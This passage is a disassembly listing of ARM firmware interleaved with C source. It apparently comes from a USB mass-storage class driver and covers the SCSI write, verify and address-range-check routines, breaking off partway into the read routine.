 800a722:	781b      	ldrb	r3, [r3, #0]
 800a724:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a726:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a728:	687b      	ldr	r3, [r7, #4]
 800a72a:	3304      	adds	r3, #4
 800a72c:	781b      	ldrb	r3, [r3, #0]
 800a72e:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a730:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a732:	687a      	ldr	r2, [r7, #4]
 800a734:	3205      	adds	r2, #5
 800a736:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a738:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a73a:	697a      	ldr	r2, [r7, #20]
 800a73c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a740:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a742:	687b      	ldr	r3, [r7, #4]
 800a744:	3307      	adds	r3, #7
 800a746:	781b      	ldrb	r3, [r3, #0]
 800a748:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a74a:	687a      	ldr	r2, [r7, #4]
 800a74c:	3208      	adds	r2, #8
 800a74e:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a750:	4313      	orrs	r3, r2
 800a752:	697a      	ldr	r2, [r7, #20]
 800a754:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a758:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a75a:	697b      	ldr	r3, [r7, #20]
 800a75c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a760:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a762:	697b      	ldr	r3, [r7, #20]
 800a764:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a768:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a76a:	7af9      	ldrb	r1, [r7, #11]
 800a76c:	68f8      	ldr	r0, [r7, #12]
 800a76e:	f000 f97a 	bl	800aa66 <SCSI_CheckAddressRange>
 800a772:	4603      	mov	r3, r0
 800a774:	2b00      	cmp	r3, #0
 800a776:	da02      	bge.n	800a77e <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a778:	f04f 33ff 	mov.w	r3, #4294967295
 800a77c:	e039      	b.n	800a7f2 <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a77e:	697b      	ldr	r3, [r7, #20]
 800a780:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a784:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a786:	697a      	ldr	r2, [r7, #20]
 800a788:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a78c:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a790:	fb02 f303 	mul.w	r3, r2, r3
 800a794:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800a796:	697b      	ldr	r3, [r7, #20]
 800a798:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a79c:	699b      	ldr	r3, [r3, #24]
 800a79e:	693a      	ldr	r2, [r7, #16]
 800a7a0:	429a      	cmp	r2, r3
 800a7a2:	d00b      	beq.n	800a7bc <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a7a4:	697b      	ldr	r3, [r7, #20]
 800a7a6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7aa:	7f59      	ldrb	r1, [r3, #29]
 800a7ac:	2320      	movs	r3, #32
 800a7ae:	2205      	movs	r2, #5
 800a7b0:	68f8      	ldr	r0, [r7, #12]
 800a7b2:	f7ff fcdf 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a7b6:	f04f 33ff 	mov.w	r3, #4294967295
 800a7ba:	e01a      	b.n	800a7f2 <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800a7bc:	693b      	ldr	r3, [r7, #16]
 800a7be:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800a7c2:	bf28      	it	cs
 800a7c4:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800a7c8:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800a7ca:	697b      	ldr	r3, [r7, #20]
 800a7cc:	2201      	movs	r2, #1
 800a7ce:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800a7d0:	4b0a      	ldr	r3, [pc, #40]	; (800a7fc <SCSI_Write10+0x1c4>)
 800a7d2:	7819      	ldrb	r1, [r3, #0]
 800a7d4:	697b      	ldr	r3, [r7, #20]
 800a7d6:	f103 0210 	add.w	r2, r3, #16
 800a7da:	693b      	ldr	r3, [r7, #16]
 800a7dc:	68f8      	ldr	r0, [r7, #12]
 800a7de:	f002 faf3 	bl	800cdc8 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800a7e2:	2300      	movs	r3, #0
 800a7e4:	e005      	b.n	800a7f2 <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800a7e6:	7afb      	ldrb	r3, [r7, #11]
 800a7e8:	4619      	mov	r1, r3
 800a7ea:	68f8      	ldr	r0, [r7, #12]
 800a7ec:	f000 f9fe 	bl	800abec <SCSI_ProcessWrite>
 800a7f0:	4603      	mov	r3, r0
}
 800a7f2:	4618      	mov	r0, r3
 800a7f4:	3718      	adds	r7, #24
 800a7f6:	46bd      	mov	sp, r7
 800a7f8:	bd80      	pop	{r7, pc}
 800a7fa:	bf00      	nop
 800a7fc:	2000010b 	.word	0x2000010b

0800a800 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a800:	b580      	push	{r7, lr}
 800a802:	b086      	sub	sp, #24
 800a804:	af00      	add	r7, sp, #0
 800a806:	60f8      	str	r0, [r7, #12]
 800a808:	460b      	mov	r3, r1
 800a80a:	607a      	str	r2, [r7, #4]
 800a80c:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a80e:	68fb      	ldr	r3, [r7, #12]
 800a810:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a814:	68fb      	ldr	r3, [r7, #12]
 800a816:	32b0      	adds	r2, #176	; 0xb0
 800a818:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a81c:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a81e:	697b      	ldr	r3, [r7, #20]
 800a820:	2b00      	cmp	r3, #0
 800a822:	d102      	bne.n	800a82a <SCSI_Write12+0x2a>
  {
    return -1;
 800a824:	f04f 33ff 	mov.w	r3, #4294967295
 800a828:	e0d7      	b.n	800a9da <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a82a:	697b      	ldr	r3, [r7, #20]
 800a82c:	7a1b      	ldrb	r3, [r3, #8]
 800a82e:	2b00      	cmp	r3, #0
 800a830:	f040 80cd 	bne.w	800a9ce <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a834:	697b      	ldr	r3, [r7, #20]
 800a836:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a83a:	699b      	ldr	r3, [r3, #24]
 800a83c:	2b00      	cmp	r3, #0
 800a83e:	d10b      	bne.n	800a858 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a840:	697b      	ldr	r3, [r7, #20]
 800a842:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a846:	7f59      	ldrb	r1, [r3, #29]
 800a848:	2320      	movs	r3, #32
 800a84a:	2205      	movs	r2, #5
 800a84c:	68f8      	ldr	r0, [r7, #12]
 800a84e:	f7ff fc91 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a852:	f04f 33ff 	mov.w	r3, #4294967295
 800a856:	e0c0      	b.n	800a9da <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a858:	697b      	ldr	r3, [r7, #20]
 800a85a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a85e:	7f1b      	ldrb	r3, [r3, #28]
 800a860:	b25b      	sxtb	r3, r3
 800a862:	2b00      	cmp	r3, #0
 800a864:	da0b      	bge.n	800a87e <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a866:	697b      	ldr	r3, [r7, #20]
 800a868:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a86c:	7f59      	ldrb	r1, [r3, #29]
 800a86e:	2320      	movs	r3, #32
 800a870:	2205      	movs	r2, #5
 800a872:	68f8      	ldr	r0, [r7, #12]
 800a874:	f7ff fc7e 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a878:	f04f 33ff 	mov.w	r3, #4294967295
 800a87c:	e0ad      	b.n	800a9da <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a87e:	68fb      	ldr	r3, [r7, #12]
 800a880:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a884:	68fa      	ldr	r2, [r7, #12]
 800a886:	33b0      	adds	r3, #176	; 0xb0
 800a888:	009b      	lsls	r3, r3, #2
 800a88a:	4413      	add	r3, r2
 800a88c:	685b      	ldr	r3, [r3, #4]
 800a88e:	689b      	ldr	r3, [r3, #8]
 800a890:	7afa      	ldrb	r2, [r7, #11]
 800a892:	4610      	mov	r0, r2
 800a894:	4798      	blx	r3
 800a896:	4603      	mov	r3, r0
 800a898:	2b00      	cmp	r3, #0
 800a89a:	d00b      	beq.n	800a8b4 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a89c:	7af9      	ldrb	r1, [r7, #11]
 800a89e:	233a      	movs	r3, #58	; 0x3a
 800a8a0:	2202      	movs	r2, #2
 800a8a2:	68f8      	ldr	r0, [r7, #12]
 800a8a4:	f7ff fc66 	bl	800a174 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a8a8:	697b      	ldr	r3, [r7, #20]
 800a8aa:	2205      	movs	r2, #5
 800a8ac:	721a      	strb	r2, [r3, #8]
      return -1;
 800a8ae:	f04f 33ff 	mov.w	r3, #4294967295
 800a8b2:	e092      	b.n	800a9da <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a8b4:	68fb      	ldr	r3, [r7, #12]
 800a8b6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a8ba:	68fa      	ldr	r2, [r7, #12]
 800a8bc:	33b0      	adds	r3, #176	; 0xb0
 800a8be:	009b      	lsls	r3, r3, #2
 800a8c0:	4413      	add	r3, r2
 800a8c2:	685b      	ldr	r3, [r3, #4]
 800a8c4:	68db      	ldr	r3, [r3, #12]
 800a8c6:	7afa      	ldrb	r2, [r7, #11]
 800a8c8:	4610      	mov	r0, r2
 800a8ca:	4798      	blx	r3
 800a8cc:	4603      	mov	r3, r0
 800a8ce:	2b00      	cmp	r3, #0
 800a8d0:	d00b      	beq.n	800a8ea <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a8d2:	7af9      	ldrb	r1, [r7, #11]
 800a8d4:	2327      	movs	r3, #39	; 0x27
 800a8d6:	2202      	movs	r2, #2
 800a8d8:	68f8      	ldr	r0, [r7, #12]
 800a8da:	f7ff fc4b 	bl	800a174 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a8de:	697b      	ldr	r3, [r7, #20]
 800a8e0:	2205      	movs	r2, #5
 800a8e2:	721a      	strb	r2, [r3, #8]
      return -1;
 800a8e4:	f04f 33ff 	mov.w	r3, #4294967295
 800a8e8:	e077      	b.n	800a9da <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a8ea:	687b      	ldr	r3, [r7, #4]
 800a8ec:	3302      	adds	r3, #2
 800a8ee:	781b      	ldrb	r3, [r3, #0]
 800a8f0:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a8f2:	687b      	ldr	r3, [r7, #4]
 800a8f4:	3303      	adds	r3, #3
 800a8f6:	781b      	ldrb	r3, [r3, #0]
 800a8f8:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a8fa:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a8fc:	687b      	ldr	r3, [r7, #4]
 800a8fe:	3304      	adds	r3, #4
 800a900:	781b      	ldrb	r3, [r3, #0]
 800a902:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a904:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a906:	687a      	ldr	r2, [r7, #4]
 800a908:	3205      	adds	r2, #5
 800a90a:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a90c:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a90e:	697a      	ldr	r2, [r7, #20]
 800a910:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a914:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a916:	687b      	ldr	r3, [r7, #4]
 800a918:	3306      	adds	r3, #6
 800a91a:	781b      	ldrb	r3, [r3, #0]
 800a91c:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a91e:	687b      	ldr	r3, [r7, #4]
 800a920:	3307      	adds	r3, #7
 800a922:	781b      	ldrb	r3, [r3, #0]
 800a924:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a926:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a928:	687b      	ldr	r3, [r7, #4]
 800a92a:	3308      	adds	r3, #8
 800a92c:	781b      	ldrb	r3, [r3, #0]
 800a92e:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a930:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a932:	687a      	ldr	r2, [r7, #4]
 800a934:	3209      	adds	r2, #9
 800a936:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a938:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a93a:	697a      	ldr	r2, [r7, #20]
 800a93c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a940:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a942:	697b      	ldr	r3, [r7, #20]
 800a944:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a948:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a94a:	697b      	ldr	r3, [r7, #20]
 800a94c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a950:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a952:	7af9      	ldrb	r1, [r7, #11]
 800a954:	68f8      	ldr	r0, [r7, #12]
 800a956:	f000 f886 	bl	800aa66 <SCSI_CheckAddressRange>
 800a95a:	4603      	mov	r3, r0
 800a95c:	2b00      	cmp	r3, #0
 800a95e:	da02      	bge.n	800a966 <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a960:	f04f 33ff 	mov.w	r3, #4294967295
 800a964:	e039      	b.n	800a9da <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a966:	697b      	ldr	r3, [r7, #20]
 800a968:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a96c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a96e:	697a      	ldr	r2, [r7, #20]
 800a970:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a974:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a978:	fb02 f303 	mul.w	r3, r2, r3
 800a97c:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800a97e:	697b      	ldr	r3, [r7, #20]
 800a980:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a984:	699b      	ldr	r3, [r3, #24]
 800a986:	693a      	ldr	r2, [r7, #16]
 800a988:	429a      	cmp	r2, r3
 800a98a:	d00b      	beq.n	800a9a4 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a98c:	697b      	ldr	r3, [r7, #20]
 800a98e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a992:	7f59      	ldrb	r1, [r3, #29]
 800a994:	2320      	movs	r3, #32
 800a996:	2205      	movs	r2, #5
 800a998:	68f8      	ldr	r0, [r7, #12]
 800a99a:	f7ff fbeb 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a99e:	f04f 33ff 	mov.w	r3, #4294967295
 800a9a2:	e01a      	b.n	800a9da <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800a9a4:	693b      	ldr	r3, [r7, #16]
 800a9a6:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800a9aa:	bf28      	it	cs
 800a9ac:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800a9b0:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800a9b2:	697b      	ldr	r3, [r7, #20]
 800a9b4:	2201      	movs	r2, #1
 800a9b6:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800a9b8:	4b0a      	ldr	r3, [pc, #40]	; (800a9e4 <SCSI_Write12+0x1e4>)
 800a9ba:	7819      	ldrb	r1, [r3, #0]
 800a9bc:	697b      	ldr	r3, [r7, #20]
 800a9be:	f103 0210 	add.w	r2, r3, #16
 800a9c2:	693b      	ldr	r3, [r7, #16]
 800a9c4:	68f8      	ldr	r0, [r7, #12]
 800a9c6:	f002 f9ff 	bl	800cdc8 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800a9ca:	2300      	movs	r3, #0
 800a9cc:	e005      	b.n	800a9da <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800a9ce:	7afb      	ldrb	r3, [r7, #11]
 800a9d0:	4619      	mov	r1, r3
 800a9d2:	68f8      	ldr	r0, [r7, #12]
 800a9d4:	f000 f90a 	bl	800abec <SCSI_ProcessWrite>
 800a9d8:	4603      	mov	r3, r0
}
 800a9da:	4618      	mov	r0, r3
 800a9dc:	3718      	adds	r7, #24
 800a9de:	46bd      	mov	sp, r7
 800a9e0:	bd80      	pop	{r7, pc}
 800a9e2:	bf00      	nop
 800a9e4:	2000010b 	.word	0x2000010b

0800a9e8 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a9e8:	b580      	push	{r7, lr}
 800a9ea:	b086      	sub	sp, #24
 800a9ec:	af00      	add	r7, sp, #0
 800a9ee:	60f8      	str	r0, [r7, #12]
 800a9f0:	460b      	mov	r3, r1
 800a9f2:	607a      	str	r2, [r7, #4]
 800a9f4:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a9f6:	68fb      	ldr	r3, [r7, #12]
 800a9f8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a9fc:	68fb      	ldr	r3, [r7, #12]
 800a9fe:	32b0      	adds	r2, #176	; 0xb0
 800aa00:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aa04:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800aa06:	697b      	ldr	r3, [r7, #20]
 800aa08:	2b00      	cmp	r3, #0
 800aa0a:	d102      	bne.n	800aa12 <SCSI_Verify10+0x2a>
  {
    return -1;
 800aa0c:	f04f 33ff 	mov.w	r3, #4294967295
 800aa10:	e025      	b.n	800aa5e <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800aa12:	687b      	ldr	r3, [r7, #4]
 800aa14:	3301      	adds	r3, #1
 800aa16:	781b      	ldrb	r3, [r3, #0]
 800aa18:	f003 0302 	and.w	r3, r3, #2
 800aa1c:	2b00      	cmp	r3, #0
 800aa1e:	d008      	beq.n	800aa32 <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800aa20:	7af9      	ldrb	r1, [r7, #11]
 800aa22:	2324      	movs	r3, #36	; 0x24
 800aa24:	2205      	movs	r2, #5
 800aa26:	68f8      	ldr	r0, [r7, #12]
 800aa28:	f7ff fba4 	bl	800a174 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800aa2c:	f04f 33ff 	mov.w	r3, #4294967295
 800aa30:	e015      	b.n	800aa5e <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800aa32:	697b      	ldr	r3, [r7, #20]
 800aa34:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa38:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aa3a:	697b      	ldr	r3, [r7, #20]
 800aa3c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa40:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa42:	7af9      	ldrb	r1, [r7, #11]
 800aa44:	68f8      	ldr	r0, [r7, #12]
 800aa46:	f000 f80e 	bl	800aa66 <SCSI_CheckAddressRange>
 800aa4a:	4603      	mov	r3, r0
 800aa4c:	2b00      	cmp	r3, #0
 800aa4e:	da02      	bge.n	800aa56 <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800aa50:	f04f 33ff 	mov.w	r3, #4294967295
 800aa54:	e003      	b.n	800aa5e <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800aa56:	697b      	ldr	r3, [r7, #20]
 800aa58:	2200      	movs	r2, #0
 800aa5a:	60da      	str	r2, [r3, #12]

  return 0;
 800aa5c:	2300      	movs	r3, #0
}
 800aa5e:	4618      	mov	r0, r3
 800aa60:	3718      	adds	r7, #24
 800aa62:	46bd      	mov	sp, r7
 800aa64:	bd80      	pop	{r7, pc}

0800aa66 <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800aa66:	b580      	push	{r7, lr}
 800aa68:	b086      	sub	sp, #24
 800aa6a:	af00      	add	r7, sp, #0
 800aa6c:	60f8      	str	r0, [r7, #12]
 800aa6e:	607a      	str	r2, [r7, #4]
 800aa70:	603b      	str	r3, [r7, #0]
 800aa72:	460b      	mov	r3, r1
 800aa74:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aa76:	68fb      	ldr	r3, [r7, #12]
 800aa78:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aa7c:	68fb      	ldr	r3, [r7, #12]
 800aa7e:	32b0      	adds	r2, #176	; 0xb0
 800aa80:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aa84:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800aa86:	697b      	ldr	r3, [r7, #20]
 800aa88:	2b00      	cmp	r3, #0
 800aa8a:	d102      	bne.n	800aa92 <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800aa8c:	f04f 33ff 	mov.w	r3, #4294967295
 800aa90:	e012      	b.n	800aab8 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800aa92:	687a      	ldr	r2, [r7, #4]
 800aa94:	683b      	ldr	r3, [r7, #0]
 800aa96:	441a      	add	r2, r3
 800aa98:	697b      	ldr	r3, [r7, #20]
 800aa9a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa9e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800aaa0:	429a      	cmp	r2, r3
 800aaa2:	d908      	bls.n	800aab6 <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800aaa4:	7af9      	ldrb	r1, [r7, #11]
 800aaa6:	2321      	movs	r3, #33	; 0x21
 800aaa8:	2205      	movs	r2, #5
 800aaaa:	68f8      	ldr	r0, [r7, #12]
 800aaac:	f7ff fb62 	bl	800a174 <SCSI_SenseCode>
    return -1;
 800aab0:	f04f 33ff 	mov.w	r3, #4294967295
 800aab4:	e000      	b.n	800aab8 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800aab6:	2300      	movs	r3, #0
}
 800aab8:	4618      	mov	r0, r3
 800aaba:	3718      	adds	r7, #24
 800aabc:	46bd      	mov	sp, r7
 800aabe:	bd80      	pop	{r7, pc}

0800aac0 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800aac0:	b590      	push	{r4, r7, lr}
 800aac2:	b085      	sub	sp, #20
 800aac4:	af00      	add	r7, sp, #0
 800aac6:	6078      	str	r0, [r7, #4]
 800aac8:	460b      	mov	r3, r1
 800aaca:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aacc:	687b      	ldr	r3, [r7, #4]
 800aace:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aad2:	687b      	ldr	r3, [r7, #4]
 800aad4:	32b0      	adds	r2, #176	; 0xb0
 800aad6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aada:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800aadc:	68fb      	ldr	r3, [r7, #12]
 800aade:	2b00      	cmp	r3, #0
 800aae0:	d102      	bne.n	800aae8 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800aae2:	f04f 33ff 	mov.w	r3, #4294967295
 800aae6:	e07b      	b.n	800abe0 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aae8:	68fb      	ldr	r3, [r7, #12]
 800aaea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaee:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aaf0:	68fa      	ldr	r2, [r7, #12]
 800aaf2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aaf6:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aafa:	fb02 f303 	mul.w	r3, r2, r3
 800aafe:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ab00:	68bb      	ldr	r3, [r7, #8]
 800ab02:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ab06:	bf28      	it	cs
